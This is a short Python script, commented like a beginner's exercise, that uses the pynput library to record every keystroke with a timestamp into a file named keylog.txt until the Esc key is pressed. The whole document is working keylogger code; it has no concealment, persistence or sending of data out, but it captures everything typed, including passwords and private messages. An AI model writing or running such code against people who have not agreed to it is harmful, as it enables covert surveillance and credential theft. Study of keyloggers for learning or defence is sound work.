from pynput.keyboard import Key,Listener
import logging

log_file="keylog.txt"
logging.basicConfig(
    filename=log_file, #filename specifies the file where logs will be saved
    level=logging.DEBUG, #Sets the logging level to capture all debug messages
    format="%(asctime)s: %(message)s" #defines the format of the logs: timestamp and the actual log message
)

def on_press(key):
    try:
        logging.info(str(key)) #Logs the key press as a string (e.g., 'a')
    except Exception as e:
        logging.error(f"Error: {e}")

def on_release(key):
    if key==Key.esc:
        return False

#specifies that on a press of a button the on_press fuction should be called.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

